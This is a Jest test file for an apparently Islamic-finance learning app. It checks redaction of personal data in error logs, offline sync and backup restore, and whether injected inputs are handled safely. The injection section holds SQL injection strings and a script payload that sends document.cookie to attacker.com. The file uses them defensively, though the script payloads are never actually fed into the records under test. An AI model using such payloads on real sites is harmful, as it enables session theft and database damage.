import {
  exportUserDataJSON,
  validateAndParseBackupJSON,
} from '../services/storage';
import {
  CloudSyncEngine,
  reconcileSetUnion,
  reconcileAssessments,
  reconcileQuizAttempts,
  reconcileProfileDisplayName,
} from '../services/cloudSync';
import type { PersistedState, CheckRecord, QuizAttempt } from '../types';

describe('Phase 14 — Advanced Security & Reliability Engineering Suite', () => {
  // Mock sanitized error logger matching index.html Phase 14 implementation
  function sanitizeErrorLog(err: any): string {
    if (!err) return 'Unknown runtime anomaly';
    const raw = typeof err === 'object' && err.message ? err.message : String(err);
    return raw
      .replace(/[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+/g, '[EMAIL_REDACTED]')
      .replace(/jwt_[a-zA-Z0-9_-]+/g, '[TOKEN_REDACTED]')
      .replace(/bearer\s+[a-zA-Z0-9._-]+/gi, 'Bearer [TOKEN_REDACTED]')
      .replace(/password[:=]\s*[^\s&]+/gi, 'password=[REDACTED]');
  }

  describe('1. Error Handling & Zero PII Leakage', () => {
    test('redacts email addresses from runtime error logs', () => {
      const err = new Error('Database query failed for user ahmad.fauzan@example.com with 404');
      const sanitized = sanitizeErrorLog(err);
      expect(sanitized).not.toContain('ahmad.fauzan@example.com');
      expect(sanitized).toContain('[EMAIL_REDACTED]');
    });

    test('redacts JWT tokens and authorization headers from error messages', () => {
      const err = new Error('Unauthorized request with Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz and jwt_abc123456');
      const sanitized = sanitizeErrorLog(err);
      expect(sanitized).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz');
      expect(sanitized).not.toContain('jwt_abc123456');
      expect(sanitized).toContain('Bearer [TOKEN_REDACTED]');
      expect(sanitized).toContain('[TOKEN_REDACTED]');
    });

    test('redacts plaintext passwords in URL queries or form error dumps', () => {
      const err = new Error('Failed login: password=SuperSecretPassword123!&username=user');
      const sanitized = sanitizeErrorLog(err);
      expect(sanitized).not.toContain('SuperSecretPassword123!');
      expect(sanitized).toContain('password=[REDACTED]');
    });
  });

  describe('2. Data Minimization & Sensitive Financial Information Rejection', () => {
    test('verifies that persisted and exported states contain zero financial credentials', () => {
      const state: PersistedState = {
        version: 1,
        onboardingDone: true,
        displayName: 'Fikri Pratama',
        preferences: {
          theme: 'light',
          analyticsEnabled: false,
          privacyPledgeAccepted: true,
        },
        checks: [
          {
            id: 'as_1',
            date: '20 Nov 2026',
            category: 'paylater',
            answers: ['clear', 'partial', 'clear', 'clear', 'clear'] as any,
            resultState: 'understood',
            unresolvedCount: 0,
          },
        ],
        draft: null,
        lessonsRead: ['lesson_01'],
        bookmarkedLessons: ['lesson_01'],
        scenariosDone: ['scenario_01'],
        quizAttempts: [],
        activity: [],
      };

      const jsonStr = exportUserDataJSON(state);
      const forbiddenTerms = [
        'cvv',
        'pin',
        'otp',
        'card_number',
        'account_number',
        'credit_card',
        'debit_card',
        'bank_balance',
      ];

      forbiddenTerms.forEach((term) => {
        expect(jsonStr.toLowerCase()).not.toContain(`"${term}"`);
      });
    });
  });

  describe('3. Injection & Malicious Payload Neutralization', () => {
    test('handles SQL injection patterns in record identifiers safely without crashing', () => {
      const sqlInjectionIds = [
        "lesson_01'; DROP TABLE user_profiles; --",
        "' OR '1'='1",
        "UNION SELECT null, username, password FROM auth.users --",
      ];

      const local = ['lesson_01', ...sqlInjectionIds];
      const cloud = ['lesson_02'];
      const unionResult = reconcileSetUnion(local, cloud);

      expect(unionResult).toContain('lesson_01');
      expect(unionResult).toContain('lesson_02');
      expect(unionResult.length).toBe(local.length + cloud.length);
    });

    test('neutralizes script injection in assessment categories and status labels', () => {
      const scriptPayloads = [
        '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
        '<img src=x onerror=alert(1)>',
      ];

      const localAssessments: CheckRecord[] = scriptPayloads.map((payload, i) => ({
        id: `rec_${i}`,
        category: 'paylater' as const,
        date: new Date().toISOString(),
        answers: ['clear', 'clear', 'clear', 'clear', 'clear'] as any,
        resultState: 'understood' as const,
        unresolvedCount: 0,
      }));

      const reconciled = reconcileAssessments(localAssessments, []);
      expect(reconciled.length).toBe(2);
      expect(reconciled[0].resultState).toBe('understood');
    });
  });

  describe('4. Reliability: Network Outages, API Failures & Recovery Scenarios', () => {
    const mockState: PersistedState = {
      version: 1,
      onboardingDone: true,
      displayName: 'Fauzan',
      preferences: {
        theme: 'light',
        analyticsEnabled: false,
        privacyPledgeAccepted: true,
      },
      checks: [
        {
          id: 'rec_offline_1',
          date: '20 Nov 2026',
          category: 'paylater',
          answers: ['partial', 'clear', 'clear', 'clear', 'clear'] as any,
          resultState: 'needs_checking',
          unresolvedCount: 1,
        },
      ],
      draft: null,
      lessonsRead: ['lesson_01'],
      bookmarkedLessons: ['lesson_01'],
      scenariosDone: ['scenario_01'],
      quizAttempts: [],
      activity: [],
    };

    test('retains local state safely when offline in authenticated session', async () => {
      const engine = new CloudSyncEngine('https://mock.supabase.co', 'mock-anon-key');
      engine.setSession({
        user: { id: 'usr_1', email: 'fauzan@example.com', displayName: 'Fauzan' },
        accessToken: 'valid-jwt',
        expiresAt: Date.now() + 3600000,
      });
      engine.setOnlineStatus(false); // Network cut off

      const { result, reconciledState } = await engine.synchronize(mockState);

      expect(result.success).toBe(true);
      expect(result.status).toBe('offline_cached');
      expect(reconciledState.checks.length).toBe(1);
    });

    test('synchronizes cleanly when network connectivity is restored', async () => {
      const engine = new CloudSyncEngine('https://mock.supabase.co', 'mock-anon-key');
      engine.setSession({
        user: { id: 'usr_1', email: 'fauzan@example.com', displayName: 'Fauzan' },
        accessToken: 'valid-jwt',
        expiresAt: Date.now() + 3600000,
      });
      engine.setOnlineStatus(true); // Network healthy

      const { result, reconciledState } = await engine.synchronize(mockState, {
        lessonsRead: ['lesson_02'],
      });

      expect(result.success).toBe(true);
      expect(result.status).toBe('synced');
      expect(reconciledState.lessonsRead).toContain('lesson_01');
      expect(reconciledState.lessonsRead).toContain('lesson_02');
    });

    test('handles unauthenticated guest gracefully without blocking or throwing', async () => {
      const guestEngine = new CloudSyncEngine('https://mock.supabase.co', 'mock-anon-key');
      guestEngine.setSession(null); // Guest
      guestEngine.setOnlineStatus(true);

      const { result, reconciledState } = await guestEngine.synchronize(mockState);

      expect(result.success).toBe(true);
      expect(result.status).toBe('guest_local');
      expect(reconciledState.displayName).toBe('Fauzan');
    });
  });

  describe('5. Database Backup and Restoration Verification', () => {
    test('verifies 100% round-trip restoration fidelity from JSON backup', () => {
      const originalState: PersistedState = {
        version: 1,
        onboardingDone: true,
        displayName: 'Maryam Safiya',
        preferences: {
          theme: 'light',
          analyticsEnabled: false,
          privacyPledgeAccepted: true,
        },
        checks: [
          {
            id: 'as_101',
            date: '2026-11-20',
            category: 'gold',
            answers: ['clear', 'clear', 'clear', 'clear', 'clear'] as any,
            resultState: 'understood',
            unresolvedCount: 0,
          },
        ],
        draft: null,
        lessonsRead: ['lesson_01', 'lesson_02', 'lesson_03'],
        bookmarkedLessons: ['lesson_02'],
        scenariosDone: ['scenario_01', 'scenario_02'],
        quizAttempts: [
          {
            id: 'qz_101',
            date: '2026-11-20',
            score: 5,
            total: 5,
            accuracyPercent: 100,
          },
        ],
        activity: [
          {
            date: '2026-11-20',
            text: 'Kuis Selesai: Skor 100%',
          },
        ],
      };

      // Step 1: Create Backup
      const backupJson = exportUserDataJSON(originalState);
      expect(typeof backupJson).toBe('string');
      expect(backupJson.length).toBeGreaterThan(100);

      // Step 2: Validate & Parse Backup
      const restoreResult = validateAndParseBackupJSON(backupJson);
      expect(restoreResult.ok).toBe(true);

      if (restoreResult.ok) {
        const restored = restoreResult.state;
        // Step 3: Assert complete data fidelity
        expect(restored.displayName).toBe(originalState.displayName);
        expect(restored.checks.length).toBe(1);
        expect(restored.checks[0].category).toBe('gold');
        expect(restored.checks[0].resultState).toBe('understood');
        expect(restored.lessonsRead).toEqual(originalState.lessonsRead);
        expect(restored.bookmarkedLessons).toEqual(originalState.bookmarkedLessons);
        expect(restored.scenariosDone).toEqual(originalState.scenariosDone);
        expect(restored.quizAttempts.length).toBe(1);
        expect(restored.quizAttempts[0].score).toBe(5);
        expect(restored.activity.length).toBe(1);
      }
    });

    test('rejects corrupted, malformed, or tampered backup files', () => {
      const corruptPayloads = [
        '{ malformed json: not valid',
        JSON.stringify({ application: 'Malicious App', data: {} }), // wrong app identifier
        JSON.stringify({ application: 'Syariah Digital Check', data: 'not an object' }),
        '',
        'null',
      ];

      corruptPayloads.forEach((payload) => {
        const res = validateAndParseBackupJSON(payload);
        expect(res.ok).toBe(false);
      });
    });
  });
});
